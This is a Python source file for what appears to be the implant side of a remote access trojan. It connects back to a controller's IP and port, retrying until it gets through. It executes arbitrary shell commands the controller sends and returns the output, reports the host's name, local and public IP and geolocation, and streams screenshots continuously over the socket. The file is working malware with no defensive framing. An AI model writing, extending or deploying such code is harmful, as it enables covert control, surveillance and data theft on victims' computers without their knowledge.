import os
import socket
import time
import tkinter as tk
import numpy as np
import cv2
import requests
import re

try:
    from PIL import ImageGrab
except ImportError:
    PIL = None

receiveSize = 524288
s = socket.socket()

def connect(ip, port, timesleep):
    try:
        s.connect((ip, port))
    except:
        time.sleep(timesleep)
        connect(ip, port, timesleep)

def receive():
    while True:
        data = s.recv(receiveSize).decode()
        if "shell" in data:
            s.send(shell(data[6:]).encode())
        elif data == "info":
            s.send(getInfo().encode())
        elif data == "screen":
            viewScreen()
        else:
            s.send("Unfind command.".encode())

def shell(command):
    legal = os.system(command)
    if legal == 0:
        result = str(os.popen(command).read())
        return result
    else:
        return "Can't run command!"
    
def getInfo():
    whois = requests.get('http://whois.pconline.com.cn/ipJson.jsp').text
    hostname = socket.gethostname()
    lip = socket.gethostbyname(hostname)
    pip = re.findall(re.compile(r'"ip":"(.*?)"'), whois)[0]
    addr = re.findall(re.compile(r'"addr":"(.*?)"'), whois)[0]
    se = ", "
    return str(hostname) + se + str(lip) + se + str(pip) + se + str(addr)

def viewScreen():
    while True:
        screen = np.array(ImageGrab.grab())
        screen = cv2.cvtColor(screen, cv2.COLOR_RGB2BGR)
        result, imgencode = cv2.imencode('.jpg', screen)
        imgdata = np.array(imgencode)
        stringData = imgdata.tostring()
        s.send(str(len(stringData)).ljust(16).encode())
        s.send(stringData)
